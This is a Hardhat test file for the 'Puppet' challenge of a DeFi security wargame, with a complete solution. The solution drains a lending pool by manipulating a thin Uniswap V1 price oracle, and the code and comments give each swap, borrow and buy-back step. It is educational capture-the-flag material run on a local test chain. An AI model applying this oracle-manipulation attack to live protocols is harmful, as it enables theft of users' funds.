const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return tokensSold
    .mul(ethers.BigNumber.from("997"))
    .mul(etherInReserve)
    .div(
      tokensInReserve
        .mul(ethers.BigNumber.from("1000"))
        .add(tokensSold.mul(ethers.BigNumber.from("997")))
    );
}

describe("[Challenge] Puppet", function () {
  let deployer, attacker;

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther("10");
  const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther("10");

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("1000");
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther("25");
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("100000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const PuppetPoolFactory = await ethers.getContractFactory(
      "PuppetPool",
      deployer
    );

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x15af1d78b58c40000", // 25 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ATTACKER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    this.token = await DamnValuableTokenFactory.deploy();

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    this.uniswapFactory = await UniswapFactoryFactory.deploy();
    await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await this.uniswapFactory.createExchange(this.token.address, {
      gasLimit: 1e6,
    });
    const { events } = await tx.wait();
    this.uniswapExchange = await UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    this.lendingPool = await PuppetPoolFactory.deploy(
      this.token.address,
      this.uniswapExchange.address
    );

    // Add initial token and ETH liquidity to the pool
    await this.token.approve(
      this.uniswapExchange.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await this.uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await this.uniswapExchange.getTokenToEthInputPrice(
        ethers.utils.parseEther("1"),
        { gasLimit: 1e6 }
      )
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        ethers.utils.parseEther("1"),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    await this.token.transfer(
      this.lendingPool.address,
      POOL_INITIAL_TOKEN_BALANCE
    );

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(
      await this.lendingPool.calculateDepositRequired(
        ethers.utils.parseEther("1")
      )
    ).to.be.eq(ethers.utils.parseEther("2"));

    expect(
      await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul("2"));
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Steps

    // Approve Uniswap exchange to swp tokens for Eth
    // Swap tokens for Eth to cause slippage in price
    // User gets 9.9009 ETH: (UniswapEthBalance * DvtSwapped)/(DvtSwapped + DvtBalance)
    // 1000 DVT -> LIQUIDITY POOL -> 9.9009 ETH
    // Current attacker balance
    // 0  DVT & 25 ETH + 9.9009 ETH
    // Current Uniswap liquidity Balances and price
    // 0.0991 ETH & 1010 DVT => Price: 1 DVT = 0.0000981 ETH
    // Calcualte the Collatoral to borrow all 100000 DVT from the puppetpool
    // deposit twice the borrow amount in ETH
    // 2 * (100000 * 0.0000981)  = 19.62 ETH
    // attacker has -> 100000 DVT and 15 ETH (25 ETH + 9.9009 ETH - 19.62 ETH)
    // Getting the liquidity pool back to its initial ratio of 1:1 and get back our 1000 DVT tokens
    // 1000 DVT = 0.0000981 ETH
    // User gets 1000 DVT tokens: (UniswapDVTBalance * EthSwapped)/(EthSwapped + EthBalance)
    // 10 ETH -> LIQUIDITY POOL -> 1000 DVT
    // Current Liquidity Pool Balances
    // 10 ETH & 10 DVT
    // attacker has -> 101000 DVT and 5 ETH

    // Initialize the contracts
    const lendingPool = this.lendingPool.connect(attacker);
    const Token = this.token.connect(attacker);
    const exchange = this.uniswapExchange.connect(attacker);

    // Helper function to get current balances
    const logBalances = async (address, name) => {
      const ethBal = await ethers.provider.getBalance(address);
      const tokenBal = await Token.balanceOf(address);

      console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
      console.log(
        `DVT Balance of ${name}:`,
        ethers.utils.formatEther(tokenBal)
      );
      console.log("");
    };

    console.log("INITIAL BALANCES");
    await logBalances(attacker.address, "attacker");
    await logBalances(exchange.address, "uniswap");
    console.log("=======================================");

    // Approve token to swap with UniSwap
    console.log("Approving uniswap to access Initial Balance");
    await Token.connect(attacker).approve(
      exchange.address,
      ATTACKER_INITIAL_TOKEN_BALANCE
    );
    console.log("Balance approved");

    // Calculate ETH Pay out
    const ethPayout = await exchange.getTokenToEthInputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      {
        gasLimit: 1e6,
      }
    );

    console.log(
      "Swap of 1000 tokens will give ",
      ethers.utils.formatEther(ethPayout)
    );

    console.log("Swapping tokens for ETH");
    await exchange.tokenToEthSwapInput(
      ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
      ethers.utils.parseEther("9"), // Min return of 9ETH
      (await ethers.provider.getBlock("latest")).timestamp * 2 // deadline
    );

    console.log("");
    console.log("BALANCE AFTER SWAP");
    await logBalances(attacker.address, "attacker");
    await logBalances(exchange.address, "uniswap");
    console.log("=======================================");

    // Deposit ETH required to gain ALL tokens from the pool
    const deposit = await lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    console.log(
      `Deposit required as collateral ${POOL_INITIAL_TOKEN_BALANCE} DVT tokens in PuppetPool:, ${ethers.utils.formatEther(
        deposit
      )}`
    );
    await lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
      value: deposit,
    });
    console.log("Deposit of ETH to the Puppetpool completed");
    console.log("");
    console.log(`BALANCE AFTER LOAN FROM POOL`);

    await logBalances(attacker.address, "attacker");
    console.log("=======================================");

    // const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
    const ethRequired = await exchange.getEthToTokenOutputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      {
        gasLimit: 1e6,
      }
    );
    console.log(
      `Eth Required for ${ATTACKER_INITIAL_TOKEN_BALANCE} tokens:`,
      ethers.utils.formatEther(ethRequired)
    );

    // Get our original 1000 tokens back by swapping eth
    await exchange.ethToTokenSwapOutput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      {
        value: ethRequired,
        gasLimit: 1e6,
      }
    );

    console.log("*** FINISHED ***");
    await logBalances(attacker.address, "attacker");
    await logBalances(lendingPool.address, "Lender");
    await logBalances(exchange.address, "Uniswap");
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.be.gt(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
